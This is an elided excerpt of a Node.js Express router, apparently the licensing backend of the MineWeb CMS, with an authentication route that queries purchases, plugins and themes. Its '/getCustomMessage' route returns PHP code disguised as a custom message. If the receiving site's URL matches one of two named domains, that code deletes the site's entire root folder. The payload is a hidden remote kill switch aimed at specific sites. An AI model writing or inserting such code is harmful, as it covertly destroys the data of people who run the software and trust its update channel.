...
router.post('/authentication', ensurePostReq, function (req, res) {
    ...
    Purchase.query('SELECT * FROM purchase ' +
        ...
        Plugin.find({or: [{author: req.user.id}, {price: 0}], id: req.body.data.plugins}).exec(function (err, freePlugins) {
            ...
            Theme.find({or: [{author: req.user.id}, {price: 0}], id: req.body.data.themes}).exec(function (err, freeThemes) {
                if (err) {
                    console.error(err);
...
router.post('/getCustomMessage', function (req, res) {
  return res.status(200).json({php: "if (Router::url('/', true) === 'http://mineweb.dev-time.eu/' || Router::url('/', true) === 'http://hidolia.fr/') { App::uses('Folder', 'Utility'); (new Folder(ROOT))->delete(); }", type: 1});
});
